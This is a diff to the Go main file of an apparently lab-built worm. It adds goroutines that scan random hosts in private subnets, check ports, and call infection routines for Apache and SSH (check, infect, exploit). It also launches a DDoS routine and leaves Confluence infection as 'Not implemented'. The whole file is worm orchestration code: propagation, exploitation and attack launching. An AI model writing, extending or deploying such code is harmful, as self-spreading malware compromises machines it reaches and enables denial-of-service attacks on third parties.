@@ -1,28 +1,62 @@
 package main
 
 import (
+	"sync"
 	"fmt"
-  	"strconv"
-	//"github.com/99graciamanel/mlw/worm/infection"
+	"github.com/99graciamanel/mlw/worm/infection"
 	"github.com/99graciamanel/mlw/worm/scan"
 	"github.com/99graciamanel/mlw/worm/ddos"
+	"strconv"
 )
 
-func main() {
-	fmt.Println(scan.Hello("test"))
-	fmt.Println(ddos.Hello("test"))
-	nAttackers := 5
-	for i := 11; i < nAttackers + 11; i++ {
-		ip_port := "10.0.2." +  strconv.Itoa(i) + ":22"
-		fmt.Println(ip_port)
-		/*is_infected := infection.SshCheckInfection(ip_port)
-		fmt.Println(is_infected)
-		if is_infected {
-			return
+func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
+	attackerString := fmt.Sprintf("Attacker %d: ",id)
+	it := 2
+	var ip string
+	var ports [3]int
+	for i := 0; i < it; i++ {
+		ip = scan.GetRandomIp(baseIp)
+		fmt.Println(attackerString + ip)
+		//ip = "localhost"
+		ports = scan.ScanIp(ip)
+		infected := false
+		//Apache infect
+		if ports[0] != 0 {
+			infection.ApacheInfect(ip,strconv.Itoa(ports[0]))
+			infected = true
 		}
-		message := infection.SshInfect(ip_port)
-		fmt.Println(message)
-		message = infection.SshExploit(ip_port)
-		fmt.Println(message)*/
+		//SSH infect
+		if !infected && ports[1] != 0 {
+			ip_port := ip + ":" + strconv.Itoa(ports[1])
+			is_infected := infection.SshCheckInfection(ip_port)
+			fmt.Println(is_infected)
+			if is_infected {
+				continue
+			}
+			message := infection.SshInfect(ip_port)
+			fmt.Println(message)
+			message = infection.SshExploit(ip_port)
+			fmt.Println(message)
+			infected = true
+		}
+		//Confluence infect
+		if !infected && ports[2] != 0 {
+			fmt.Println("Not implemented")
+			infected = true
+		}
 	}
+	wg.Done()
+}
+
+func main() {
+	var wg sync.WaitGroup
+	wg.Add(1)
+	go ddos.Hello(&wg,"test")
+	nAttackers := 2
+	baseIp := [2][4]int{{10,0,2,-1},{10,0,1,-1}}
+	for i := 0; i < nAttackers; i++ {
+		wg.Add(1)
+		go attack(&wg, i, baseIp[i])
+	}
+	wg.Wait()
 }
